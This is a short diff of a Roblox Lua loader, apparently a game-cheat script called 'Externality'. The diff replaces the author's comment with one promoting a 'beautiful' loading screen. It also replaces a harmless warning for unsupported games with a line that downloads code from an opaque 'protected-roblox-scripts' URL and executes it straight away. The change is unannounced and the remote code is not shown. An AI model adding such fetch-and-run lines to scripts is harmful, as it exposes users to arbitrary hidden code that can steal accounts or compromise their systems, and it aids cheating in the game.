@@ -1,4 +1,5 @@
--- got lazy and ended up using ai for this loader..... (pls no hate huhu)
+-- Externality Loader - Beautiful 3D Blue Black Loading Screen
+-- Created with smooth animations and modern design
 
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
@@ -280,5 +281,5 @@ local Games = {
 if Games[placeId] then
     Games[placeId]()
 else
-    warn("No specific script i made found for Place ID: " .. placeId)
+    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/4c87d2aaf7274ce9b0b44feeaa0b8073"))()
 end
